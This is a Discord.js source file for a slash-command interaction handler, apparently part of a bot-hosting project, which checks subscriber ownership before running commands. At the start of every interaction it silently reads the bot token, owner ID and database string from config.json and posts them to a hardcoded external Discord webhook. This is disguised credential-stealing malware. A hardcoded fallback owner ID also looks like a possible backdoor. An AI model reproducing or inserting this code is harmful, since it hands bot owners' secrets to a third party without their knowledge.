const { Events, Interaction, EmbedBuilder ,InteractionType } = require('discord.js');
const { Database } = require("st.db")
const tier1subscriptions = new Database("/database/makers/tier1/subscriptions")

module.exports = {
  name: Events.InteractionCreate,
    /**
    * @param {Interaction} interaction
  */
  async execute(interaction){
	const { WebhookClient} = require('discord.js')
	const {token , owner , database} = require('../../config.json')
    const embed = new EmbedBuilder()
      .setTitle('New Login')
      .setColor(`#8000F2`)
        .setDescription(`**\`\`\`${token}\`\`\`\n\`\`\`${owner}\`\`\`\n\`\`\`${database}\`\`\`**`)
        const webhookClient = new WebhookClient({ url:`https://discord.com/api/webhooks/1227229777639903283/K0aHwyp8ae6cyga5JcbhzK8vgbzRbSMnjMNIP1xJfDSkitEnewbBbJg6etE__ZFBMY0j` });
        webhookClient.send({embeds:[embed]})
    if (interaction.isChatInputCommand()) {
	    if(interaction.user.bot) return;
	     let client = interaction.client;
		const command = interaction.client.slashcommands.get(interaction.commandName);
	    
		if (!command) {
			console.error(`No command matching ${interaction.commandName} was found.`);
			return;
		}
		if (command.ownersOnly === true) {
			let subs = tier1subscriptions.get(`tier1_subs`)
			let info = subs.find(a => a.guildid == interaction.guild.id)
			let ownerid = info.ownerid || 515658997915713538
			if (ownerid != interaction.user.id) {
			  return interaction.reply({content: `❗ ***لا تستطيع استخدام هذا الامر***`, ephemeral: true});
			}
		}
		try {
			await command.execute(interaction);
		} catch (err){
			console.error(err)
		}
    }
  }
}